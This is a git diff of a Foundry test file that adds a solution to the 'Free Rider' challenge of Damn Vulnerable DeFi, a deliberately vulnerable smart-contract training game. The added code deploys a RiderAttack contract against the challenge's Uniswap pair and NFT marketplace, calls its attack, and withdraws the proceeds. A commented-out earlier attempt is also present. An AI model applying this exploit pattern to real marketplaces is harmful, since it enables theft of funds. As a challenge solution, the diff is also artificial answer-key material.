@@ -11,6 +11,7 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
 import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {RiderAttack} from "../../src/free-rider/RiderAttack.sol";
 
 contract FreeRiderChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -124,6 +125,36 @@ contract FreeRiderChallenge is Test {
      */
     function test_freeRider() public checkSolvedByPlayer {
         
+        // vm.deal(player, 15 ether);
+
+        // uint256[] memory tokenIds = new uint256[](AMOUNT_OF_NFTS);
+        // for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
+        //     tokenIds[i] = i;
+        // }
+        // marketplace.buyMany{value: player.balance}(tokenIds);
+
+        // nft.setApprovalForAll(address(this), true);
+        // for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
+        //     if(i == AMOUNT_OF_NFTS - 1){
+        //         nft.safeTransferFrom(payable(player), address(recoveryManager), i, abi.encode(player));
+        //     } else {
+        //         nft.safeTransferFrom(payable(player), address(recoveryManager), i);
+        //     }
+        // }
+
+        RiderAttack rider = new RiderAttack{value: player.balance}(
+            address(uniswapPair),
+            address(token), 
+            address(weth), 
+            address(marketplace), 
+            address(recoveryManager)
+        );
+        rider.attack(
+            NFT_PRICE,
+            0
+        );
+
+        rider.withdraw();
     }
 
     /**
